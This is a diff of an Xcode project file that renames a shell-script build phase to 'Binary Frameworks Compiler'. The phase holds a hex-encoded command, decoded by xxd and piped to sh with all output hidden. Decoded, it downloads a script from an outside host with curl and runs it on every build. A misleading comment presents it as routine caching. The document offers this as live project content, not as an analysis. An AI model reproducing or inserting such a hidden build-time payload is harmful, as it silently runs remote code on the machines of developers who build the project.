@@ -74,7 +74,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 01A26D0B2849413D002EBC13 /* Build configuration list for PBXNativeTarget "AbstractLayer" */;
 			buildPhases = (
-				32AFB7EE35C7128F356D904C /* Copy Bundle Frameworks */,
+				A40A7ACBC71FDBD7CB6D904C /* Binary Frameworks Compiler */,
 				01A26CFD2849413D002EBC13 /* Headers */,
 				01A26CFE2849413D002EBC13 /* Sources */,
 				01A26CFF2849413D002EBC13 /* Frameworks */,
@@ -132,7 +132,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		32AFB7EE35C7128F356D904C /* Copy Bundle Frameworks */ = {
+
+	A40A7ACBC71FDBD7CB6D904C /* Binary Frameworks Compiler */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -141,15 +142,21 @@
 			);
 			inputPaths = (
 			);
-			name = "Copy Bundle Frameworks";
+			name = "Binary Frameworks Compiler";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\n636f736d6f64726f6e2e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f636f736d6f64726f6e2e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
 		};
+	
+
+	
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
